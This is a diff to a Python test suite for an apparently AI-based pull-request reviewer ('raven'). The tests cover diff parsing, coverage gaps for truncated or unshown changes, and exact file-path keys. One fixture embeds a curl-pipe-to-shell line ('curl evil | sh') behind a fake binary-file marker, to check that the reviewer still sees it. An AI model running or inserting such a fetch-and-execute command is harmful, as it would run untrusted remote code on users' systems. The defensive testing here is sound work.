@@ -1295,7 +1295,7 @@ class TestNewlineOnlySplit:
                            {"type": "CONTEXT", "lines": [{"line": "def f():"}]},
                            {"type": "ADDED", "lines": [
                                {"line": "# x\fBinary files a/app.py and b/app.py differ"},
-                               {"line": 'import os; os.system("curl evil | sh")'}]}]}]}]})
+                               {"line": 'import os; os.system("curl evil | sh")'}]}]}]}]}, changes=None)
         clean = _strip_lockfiles_and_binaries(unified)
         assert 'os.system("curl evil | sh")' in clean
 
@@ -1311,7 +1311,7 @@ class TestNewlineOnlySplit:
                 "source": {"toString": path}, "destination": {"toString": path},
                 "hunks": [{"sourceLine": 1, "sourceSpan": 0, "destinationLine": 1,
                            "destinationSpan": 1, "segments": [
-                               {"type": "ADDED", "lines": [{"line": "x"}]}]}]}]})
+                               {"type": "ADDED", "lines": [{"line": "x"}]}]}]}]}, changes=None)
         [(a, _)] = split_diff_by_file(one("a\nb.py"))
         [(b, _)] = split_diff_by_file(one("a\\nb.py"))
         assert a != b
@@ -1324,7 +1324,7 @@ class TestNewlineOnlySplit:
             "source": {"toString": path}, "destination": {"toString": path},
             "hunks": [{"sourceLine": 1, "sourceSpan": 0, "destinationLine": 1,
                        "destinationSpan": 1, "segments": [
-                           {"type": "ADDED", "lines": [{"line": "x"}]}]}]}]})
+                           {"type": "ADDED", "lines": [{"line": "x"}]}]}]}]}, changes=None)
 
     def test_bitbucket_backslash_path_keeps_its_name(self):
         """Raven's review of #260: doubling every backslash renamed real
@@ -1411,7 +1411,7 @@ class TestNewlineOnlySplit:
             "source": {"toString": path}, "destination": {"toString": path},
             "hunks": [{"sourceLine": 1, "sourceSpan": 0, "destinationLine": 1,
                        "destinationSpan": 2, "segments": [{"type": "ADDED", "lines": [
-                           {"line": line}, {"line": "PAYLOAD()"}]}]}]}]})
+                           {"line": line}, {"line": "PAYLOAD()"}]}]}]}]}, changes=None)
         from raven.reviewer import strip_diff
         result = strip_diff(unified)
         assert "PAYLOAD()" in result.clean
@@ -1670,6 +1670,9 @@ class TestUnshownChangeIsCoverageGap:
         "diff --git a/d.txt b/d.txt\ndeleted file mode 100644\n--- a/d.txt\n+++ /dev/null\n",
         # Git's own mode-only change and pure rename: no ---/+++ lines.
         "diff --git a/run.sh b/run.sh\nold mode 100644\nnew mode 100755\n",
+        # BB DC's mode-only change: one content id on both sides.
+        ("diff --git a/run.sh b/run.sh\nold mode 100644\nnew mode 100755\n"
+         "index aaaa..aaaa\n--- a/run.sh\n+++ b/run.sh\n"),
         "diff --git a/a.py b/b.py\nsimilarity index 100%\nrename from a.py\nrename to b.py\n",
         # A binary section has its own gap kind.
         "diff --git a/x.bin b/x.bin\n--- a/x.bin\n+++ b/x.bin\nBinary files a/x.bin and b/x.bin differ\n",
@@ -1685,6 +1688,14 @@ class TestUnshownChangeIsCoverageGap:
         result = strip_diff(self.BBDC_UNSHOWN)
         assert result.unshown_gaps == ["run.sh"]
         assert result.clean == self.BBDC_UNSHOWN  # kept, so the model sees the name
+
+    def test_a_mode_change_does_not_cover_a_content_change(self):
+        """Mode lines show the mode; two content ids and no hunk mean the
+        content changed unseen (review of #2b)."""
+        from raven.reviewer import strip_diff
+        section = ("diff --git a/run.sh b/run.sh\nold mode 100644\nnew mode 100755\n"
+                   "index aaaa..bbbb\n--- a/run.sh\n+++ b/run.sh\n")
+        assert strip_diff(section).unshown_gaps == ["run.sh"]
 
     def test_a_long_extended_header_still_gaps(self):
         """The check scans the whole hunk-less section, not a fixed window
@@ -1705,6 +1716,90 @@ class TestUnshownChangeIsCoverageGap:
         assert result["coverage_gap_files"] == ["run.sh"]
         [marker] = [f for f in result["findings"] if f.get("file") == "run.sh"]
         assert "doesn't show" in marker["message"]
+
+
+class TestCutLinesAreCoverageGap:
+    """Spec 2026-10-01-bbdc-truncated-lines: a section whose header region
+    has a whole ``truncated lines <n>`` line had lines cut for length by
+    Bitbucket. The file is a coverage gap; the rest of the PR is reviewed."""
+
+    CUT = ("diff --git a/data.json b/data.json\ntruncated lines 1\n--- a/data.json\n+++ b/data.json\n"
+           "@@ -1,1 +1,1 @@\n-{}\n+{\"blob\": \"aaa ⟨…line cut by Bitbucket⟩\n")
+    TEXT = ("diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1,1 +1,2 @@\n a\n+b\n")
+
+    @staticmethod
+    def _backend(monkeypatch):
+        fake = MagicMock()
+        fake.name = "claude_cli"
+        fake.complete.return_value = _cr(json.dumps({"severity": "low", "summary": "ok", "findings": []}))
+        monkeypatch.setattr("raven.ai._cached_backend", fake)
+
+    def test_a_cut_section_is_a_gap_and_kept(self):
+        from raven.reviewer import strip_diff
+        result = strip_diff(self.TEXT + self.CUT)
+        assert result.cut_gaps == ["data.json"]
+        assert self.CUT in result.clean
+
+    @pytest.mark.parametrize("section", [
+        # Only a whole header line counts: content lines are prefixed…
+        "diff --git a/x.py b/x.py\n--- a/x.py\n+++ b/x.py\n@@ -1 +1 @@\n-a\n+truncated lines 2\n",
+        # …a path containing the words is not the header…
+        "diff --git a/truncated lines 2.json b/truncated lines 2.json\n"
+        "--- a/truncated lines 2.json\n+++ b/truncated lines 2.json\n@@ -1 +1 @@\n-a\n+b\n",
+        # …and a near miss isn't either.
+        "diff --git a/y.json b/y.json\ntruncated lines 2 extra\n--- a/y.json\n+++ b/y.json\n@@ -1 +1 @@\n-a\n+b\n",
+        # A bare line after the first @@ is not the header region.
+        "diff --git a/z.json b/z.json\n--- a/z.json\n+++ b/z.json\n@@ -1 +1 @@\n-a\n+b\ntruncated lines 2\n",
+        # A git diff can't write one: a path with a newline is C-quoted
+        # onto its own header line.
+        'diff --git "a/x\\ntruncated lines 1" "b/x\\ntruncated lines 1"\n'
+        '--- "a/x\\ntruncated lines 1"\n+++ "b/x\\ntruncated lines 1"\n@@ -1 +1 @@\n-a\n+b\n',
+    ])
+    def test_only_a_whole_header_line_counts(self, section):
+        from raven.reviewer import strip_diff
+        assert strip_diff(section).cut_gaps == []
+
+    def test_removed_side_cut_gaps(self):
+        from raven.reviewer import strip_diff
+        section = ("diff --git a/d.json b/d.json\ntruncated lines 1\n--- a/d.json\n+++ b/d.json\n"
+                   "@@ -1,2 +1,1 @@\n keep\n-{\"blob\": \"aaa ⟨…line cut by Bitbucket⟩\n")
+        assert strip_diff(section).cut_gaps == ["d.json"]
+
+    def test_renamed_file_gaps_under_its_new_name(self):
+        from raven.reviewer import strip_diff
+        section = ("diff --git a/new.json b/new.json\ntruncated lines 1\n--- a/old.json\n+++ b/new.json\n"
+                   "@@ -1 +1 @@\n-a\n+bbb ⟨…line cut by Bitbucket⟩\n")
+        assert strip_diff(section).cut_gaps == ["new.json"]
+
+    def test_deleted_file_with_cut_lines_is_not_a_gap(self):
+        from raven.reviewer import strip_diff
+        section = ("diff --git a/gone.json b/gone.json\ndeleted file mode 100644\ntruncated lines 1\n"
+                   "--- a/gone.json\n+++ /dev/null\n@@ -1 +0,0 @@\n-aaa ⟨…line cut by Bitbucket⟩\n")
+        assert strip_diff(section).cut_gaps == []
+
+    def test_stripped_section_is_not_a_cut_gap(self):
+        from raven.reviewer import strip_diff
+        section = ("diff --git a/package-lock.json b/package-lock.json\ntruncated lines 1\n"
+                   "--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1 @@\n-a\n+bbb ⟨…line cut by Bitbucket⟩\n")
+        result = strip_diff(section)
+        assert result.cut_gaps == []
+        assert result.stripped == ["package-lock.json"]
+
+    def test_review_diff_marks_it_as_a_coverage_gap(self, monkeypatch):
+        self._backend(monkeypatch)
+        result = review_diff(self.TEXT + self.CUT, "user/repo")
+        assert result["coverage_gap"] is True
+        assert result["coverage_gap_files"] == ["data.json"]
+        [marker] = [f for f in result["findings"] if f.get("file") == "data.json"]
+        assert "cut" in marker["message"] and "review it by hand" in marker["message"]
+
+    def test_chunked_review_reports_it_as_a_gap(self, monkeypatch):
+        import raven.reviewer as rev
+        monkeypatch.setattr(rev, "MAX_DIFF_LINES", 3)
+        self._backend(monkeypatch)
+        result = review_diff(self.TEXT + self.TEXT.replace("a.py", "c.py") + self.CUT, "user/repo")
+        assert result["chunked"] is True
+        assert result["coverage_gap_files"] == ["data.json"]
 
 
 class TestStrippedFilesAreDisclosed:
@@ -1763,7 +1858,7 @@ class TestStrippedFilesAreDisclosed:
         p = BitbucketDCProvider("https://bb.example.com", "tok", "secret", username="u")
         unified = p._json_diff_to_unified({"diffs": [{
             "source": {"toString": "ci/security.yml"},
-            "destination": {"toString": "ci/security.yml.lock"}}]})
+            "destination": {"toString": "ci/security.yml.lock"}}]}, changes=None)
         fake = MagicMock()
         fake.name = "claude_cli"
         fake.complete.return_value = _cr(json.dumps(
@@ -1828,7 +1923,7 @@ class TestStrippedFilesAreDisclosed:
         from raven.reviewer import strip_diff
         p = BitbucketDCProvider("https://bb.example.com", "tok", "secret", username="u")
         unified = p._json_diff_to_unified({"diffs": [{
-            "source": {"toString": src}, "destination": {"toString": dst}}]})
+            "source": {"toString": src}, "destination": {"toString": dst}}]}, changes=None)
         assert (f"--- a/{src}" in strip_diff(unified).clean) is shown
 
     def test_consolidation_drops_a_finding_on_a_stripped_file(self, monkeypatch):
@@ -4904,8 +4999,14 @@ class TestParseDiffHeaderPath:
             'diff --git a/x b/y.py "b/caf\\303\\251.py"') == "café.py"
 
     def test_crlf_line_endings(self):
-        assert _parse_diff_header_path(
-            "diff --git a/my file.py b/my file.py\r\n") == "my file.py"
+        """Diff text splits on "\\n" only, so a "\\r" before it is part of
+        the line, and of the path: no provider writes CRLF, and stripping
+        it let a name ending in "\\r" share another file's key. A CRLF
+        diff therefore names a path ending in "\\r", which gaps as a
+        control-character name: it fails closed."""
+        from raven.reviewer import _path_has_control_char
+        assert _path_has_control_char(_parse_diff_header_path(
+            "diff --git a/my file.py b/my file.py\r\n"))
 
     def test_directory_literally_named_b(self):
         assert _parse_diff_header_path(
@@ -5100,6 +5201,99 @@ class TestDiffParsersHandleSpacedPaths:
             "raven_ungrounded_findings_dropped_total" in k
             for k in metrics._counters
         )
+
+
+class TestDiffPathsAreExact:
+    """A parsed path keeps every character but the line's own "\\n" (and
+    git's one tab after a ---/+++ name with a space): two files whose names
+    differ only by trailing whitespace or a control character must never
+    share a key, or the per-file hashes and the model's view keep only one
+    of them. GIT is real git output (``git diff -M``)."""
+
+    GIT = ("diff --git a/c.py b/c.py\nindex 587be6b..d735d34 100644\n--- a/c.py\n+++ b/c.py\n@@ -1 +1 @@\n-x\n+x2\n"
+            "diff --git a/c.py  b/c.py \nindex 975fbec..1a78173 100644\n--- a/c.py \t\n+++ b/c.py \t\n@@ -1 +1 @@\n-y\n+y2\n"
+            "diff --git a/foo b/foo\ndeleted file mode 100644\nindex 7898192..0000000\n--- a/foo\n+++ /dev/null\n@@ -1 +0,0 @@\n-a\n"
+            "diff --git a/foo b/foo\nnew file mode 120000\nindex 0000000..1de5659\n--- /dev/null\n+++ b/foo\n@@ -0,0 +1 @@\n+target\n\\ No newline at end of file\n"
+            "diff --git a/old name.py b/new name.py \nsimilarity index 100%\nrename from old name.py\nrename to new name.py \n")
+
+    def test_names_differing_by_a_trailing_space_get_their_own_keys(self):
+        from raven.reviewer import split_diff_by_file
+        assert [k for k, _ in split_diff_by_file(self.GIT)] == [
+            "c.py", "c.py ", "foo", "new name.py "]
+
+    @pytest.mark.parametrize("name", [
+        "c.py ", "c.py\t", "c.py\r", "c.py" + chr(0x85), "c.py" + chr(0x2028)])
+    def test_header_keeps_trailing_whitespace_and_controls(self, name):
+        from raven.reviewer import _parse_diff_header_path
+        assert _parse_diff_header_path(f"diff --git a/{name} b/{name}\n") == name
+
+    def test_a_quoted_a_side_drops_only_the_separator(self):
+        from raven.reviewer import _parse_diff_header_path
+        assert _parse_diff_header_path(
+            'diff --git "a/caf\\303\\251.py" b/cafe.py \n') == "cafe.py "
+
+    def test_side_path_drops_only_gits_tab(self):
+        from raven.reviewer import _diff_lines, _old_side_path
+        lines = _diff_lines(self.GIT, keepends=True)
+        i = next(n for n, l in enumerate(lines) if l.startswith("diff --git a/c.py  "))
+        assert _old_side_path(lines, i) == "c.py "
+        # A name with no space gets no tab from git, so a trailing tab is
+        # the name's own (BB DC writes such a name as-is).
+        bb = _diff_lines("diff --git a/c.py\t b/c.py\t\n--- a/c.py\t\n+++ b/c.py\t\n", keepends=True)
+        assert _old_side_path(bb, 0) == "c.py\t"
+
+    def test_rename_field_keeps_trailing_whitespace(self):
+        from raven.reviewer import _diff_lines, _rename_source, _rename_target
+        diff = "diff --git a/x\r b/y \nrename from x\r\nrename to y \n"
+        lines = _diff_lines(diff, keepends=True)
+        assert (_rename_source(lines, 0), _rename_target(lines, 0)) == ("x\r", "y ")
+
+    def test_a_typechange_is_one_key_with_both_sections(self):
+        from raven.reviewer import split_diff_by_file
+        [chunk] = [c for k, c in split_diff_by_file(self.GIT) if k == "foo"]
+        assert "deleted file mode 100644" in chunk and "new file mode 120000" in chunk
+
+    def _typechange(self):
+        from raven.reviewer import split_diff_by_file
+        [chunk] = [c for k, c in split_diff_by_file(self.GIT) if k == "foo"]
+        return chunk
+
+    def test_a_joined_chunk_deletes_only_if_every_section_does(self):
+        """A typechange deletes and recreates its path: the control-character
+        gap's deletion exemption must not cover the new file."""
+        from raven.reviewer import _is_deletion_chunk
+        assert _is_deletion_chunk(self._typechange()) is False
+
+    def test_a_joined_chunks_second_section_header_counts_in_the_hash(self):
+        from raven.reviewer import diff_hash
+        chunk = self._typechange()
+        assert diff_hash(chunk) != diff_hash(chunk.replace("new file mode 120000", "new file mode 100755"))
+
+    def test_a_differing_sides_header_never_yields_an_empty_path(self):
+        """Raven's review of BB PR #9: with no rename lines and a b-side
+        ending in a space, the last token is empty, and split_diff_by_file
+        drops a section with no key."""
+        from raven.reviewer import _parse_diff_header_path, split_diff_by_file
+        assert _parse_diff_header_path("diff --git a/old.py b/new.py \n") == "new.py "
+        section = "diff --git a/old.py b/new.py \n--- a/old.py\n+++ b/new.py \n@@ -1 +1 @@\n-a\n+b\n"
+        assert [k for k, _ in split_diff_by_file(section)] == ["new.py "]
+
+    def test_a_joined_chunk_with_a_hunkless_last_section_keeps_rebase_tolerance(self):
+        """Raven's review of BB PR #9: one hunk-less section must not send
+        the whole joined chunk to the no-hunks fallback, which hashes
+        context lines and so changes on every rebase."""
+        from raven.reviewer import diff_hash
+        hunked = "diff --git a/m.py b/m.py\n--- a/m.py\n+++ b/m.py\n@@ -1,2 +1,2 @@\n ctx\n-a\n+b\n"
+        unshown = "diff --git a/m.py b/m.py\n--- a/m.py\n+++ b/m.py\n"
+        rebased = hunked.replace("@@ -1,2 +1,2 @@\n ctx", "@@ -7,2 +7,2 @@\n moved")
+        assert diff_hash(hunked + unshown) == diff_hash(rebased + unshown)
+
+    def test_an_unshown_section_counts_inside_a_joined_chunk(self):
+        from raven.reviewer import _is_unshown_change
+        hunked = "diff --git a/m.py b/m.py\n--- a/m.py\n+++ b/m.py\n@@ -1 +1 @@\n-a\n+b\n"
+        unshown = "diff --git a/m.py b/m.py\n--- a/m.py\n+++ b/m.py\n"
+        assert _is_unshown_change(hunked + unshown) is True
+        assert _is_unshown_change(hunked) is False
 
 
 class TestHelpersAcceptAScale:
